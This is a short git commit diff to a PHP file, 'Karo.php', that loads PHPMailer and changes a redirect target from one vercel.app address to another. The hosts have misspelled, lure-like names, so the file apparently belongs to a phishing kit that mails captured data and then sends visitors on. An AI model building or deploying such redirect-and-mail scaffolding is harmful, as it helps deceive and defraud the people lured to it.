f85553cca579d80c86fd6eed7b1ec52a99f5dc1a
Jala343755 <jessicajolina410@gmail.com>
2025-08-29 23:56:37 +0500

    Update Karo.php

--- Karo.php
+++ Karo.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://more-your-selfie-rewview.vercel.app/");
+header("Location: https://amazing-data-appely.vercel.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
